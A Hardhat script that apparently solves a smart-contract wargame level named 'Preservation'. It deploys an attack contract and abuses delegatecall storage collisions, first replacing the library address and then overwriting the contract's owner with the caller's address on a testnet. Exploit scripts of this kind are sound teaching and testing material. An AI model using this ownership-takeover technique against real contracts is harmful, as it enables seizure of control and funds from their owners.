const {ethers} = require("hardhat");
const {BigNumber} = require("ethers");
require('dotenv').config()

async function main() {
  const Preservation = await ethers.getContractFactory("Preservation");
  const preservation = await Preservation.attach(process.env.PRESERVATION_ADDR);
  console.log(`owner: ${await preservation.owner()}`);
  console.log(`timeZone1Library: ${await preservation.timeZone1Library()}`);
  console.log(`timeZone2Library: ${await preservation.timeZone2Library()}`);

  const PreservationHack = await ethers.getContractFactory("PreservationHack");
  const preservation_hack = await PreservationHack.deploy();
  await preservation_hack.deployed();
  // const preservation_hack = await PreservationHack.attach('0xd072F1bb6Cea8506735C044fAb8f60047Dbda035');
  console.log(`preservation_hack addr: ${preservation_hack.address}`);

  // delegate call may fail with [out of gas], use big gasLimit
  // check https://rinkeby.etherscan.io/tx/0x6ae0f982637685e9d26495b5a23881811e91e7a075491927f5aa8ad8afebb333
  let tx = await preservation.setSecondTime(BigNumber.from(preservation_hack.address), {
    gasLimit: 1000000,
  });
  await tx.wait();
  console.log(`timeZone1Library: ${await preservation.timeZone1Library()}`);

  const [user] = await ethers.getSigners();
  console.log(`user addr: ${user.address}`);
  tx = await preservation.setFirstTime(BigNumber.from(user.address), {
    gasLimit: 1000000,
  });
  await tx.wait();
  console.log(`owner: ${await preservation.owner()}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
